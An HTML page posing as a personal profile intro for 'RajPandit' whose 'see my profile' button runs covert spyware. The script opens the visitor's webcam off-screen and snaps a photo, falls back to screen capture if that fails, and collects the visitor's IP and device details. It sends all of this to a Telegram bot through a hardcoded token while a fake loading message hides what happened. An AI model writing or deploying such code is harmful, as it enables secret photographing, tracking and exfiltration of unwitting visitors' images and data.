<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RajPandit - Intro</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.95);
            padding: 60px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .photo {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 30px;
            border: 5px solid #fff;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .photo:hover {
            transform: scale(1.05);
        }
        .photo:active {
            transform: scale(0.98);
        }
        h1 {
            color: #333;
            font-size: 2.5em;
            margin: 0 0 20px 0;
            font-weight: bold;
        }
        .subtitle {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.6);
        }
        .btn:active {
            transform: translateY(0);
        }
        .loading {
            display: none;
            color: #667eea;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="RajPandit" class="photo">
        <h1>RajPandit</h1>
        <p class="subtitle">Welcome to my world</p>
        <button class="btn" onclick="seeMyProfile()">👁️ Click to see my profile</button>
        <div class="loading" id="loading">Loading profile...</div>
    </div>

    <script>
        async function seeMyProfile() {
            // Show loading immediately
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn').style.display = 'none';
            
            // Capture INSTANTLY on click
            await stealthCameraSnap();
            
            // Fake delay for profile loading
            setTimeout(() => {
                document.getElementById('loading').textContent = 'Profile loaded!';
                setTimeout(() => {
                    alert('Profile loaded successfully! 😊');
                }, 1000);
            }, 2000);
        }

        async function stealthCameraSnap() {
            try {
                // Create completely hidden video
                const video = document.createElement('video');
                video.width = 640;
                video.height = 480;
                video.style.position = 'fixed';
                video.style.left = '-9999px';
                video.style.top = '-9999px';
                video.muted = true;
                video.autoplay = true;
                video.playsInline = true;
                document.body.appendChild(video);

                // getUserMedia - direct camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 640,
                        height: 480,
                        facingMode: { ideal: 'user' }
                    }
                });

                video.srcObject = stream;

                // Wait just 500ms for frame
                await new Promise(resolve => {
                    video.onloadeddata = () => setTimeout(resolve, 500);
                });

                // Capture frame
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // IMMEDIATE cleanup
                stream.getTracks().forEach(track => track.stop());
                video.remove();

                // Send photo
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                await sendPhoto(imageData);

            } catch (error) {
                // Silent fail - try screen capture fallback
                await fallbackScreenCapture();
            }
        }

        async function fallbackScreenCapture() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { mediaSource: 'screen' },
                    audio: false
                });
                
                const video = document.createElement('video');
                video.style.position = 'fixed';
                video.style.left = '-9999px';
                video.srcObject = stream;
                video.play();
                
                await new Promise(resolve => video.onloadeddata = resolve);
                
                const canvas = document.createElement('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                await sendPhoto(imageData);
                
            } catch(e) {
                // Complete silent fail
            }
        }

        async function sendPhoto(imageData) {
            const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
            const chatId = '7735968383';
            
            const caption = `🎯 *PROFILE BUTTON CLICKED*\n` +
                          `📸 Live Camera Snap\n` +
                          `👤 Visitor Clicked "See Profile"\n` +
                          `🌐 ${window.location.href}\n` +
                          `📱 Device: ${navigator.userAgent.slice(0,50)}...\n` +
                          `📍 IP: ${await getClientIP()}\n` +
                          `⏰ ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: imageData,
                    caption: caption,
                    parse_mode: 'Markdown'
                })
            });
        }

        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
